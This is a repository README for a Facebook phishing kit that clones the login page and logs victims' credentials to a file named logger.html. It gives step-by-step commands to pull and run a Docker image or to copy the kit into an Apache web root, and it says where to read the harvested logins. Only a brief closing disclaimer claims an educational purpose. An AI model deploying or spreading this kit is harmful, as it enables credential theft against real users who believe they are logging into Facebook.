

---

## Facebook Phishing Code

This repository contains the code for a Facebook phishing page, packaged as a Docker container. You can use this code to create a Facebook clone page that logs credentials entered by users.

### Docker Hub

You can pull the Docker image from the following link:

```sh
docker pull hacksudov1/myfbphish
```

### How It Works

- The phishing page is a clone of Facebook's login page.
- When a victim attempts to log in, their credentials are captured and stored.
- The captured data is saved in a file named `logger.html`.

### Running with Docker

1. **Pull the Docker Image**

   ```sh
   docker pull hacksudov1/myfbphish
   ```

2. **Run the Docker Container**

   ```sh
   docker run -d -p 80:80 hacksudov1/myfbphish
   ```

3. **Access the Phishing Page**

   Open your browser and navigate to `http://localhost` to view the phishing page.

4. **Access Logged Data**

   After a victim attempts to log in, you can view the logged data by navigating to:

   ```
   http://localhost/logger.html
   ```

### Cloning and Running with Apache2

1. **Clone the Repository**

   ```sh
   git clone https://github.com/your_username/myfbphish.git
   ```

2. **Move the Code to the Web Directory**

   ```sh
   sudo cp -r myfbphish/* /var/www/html/
   ```

3. **Start Apache2 Service**

   ```sh
   sudo service apache2 start
   ```

4. **Access the Phishing Page**

   Open your browser and navigate to `http://localhost` to view the phishing page.

5. **Access Logged Data**

   After a victim attempts to log in, you can view the logged data by navigating to:

   ```
   http://localhost/logger.html
   ```

---

**Disclaimer:** This code is for educational purposes only. Unauthorized use of this code to obtain login credentials without permission is illegal and unethical. Use this responsibly and only for authorized security testing and research.

---
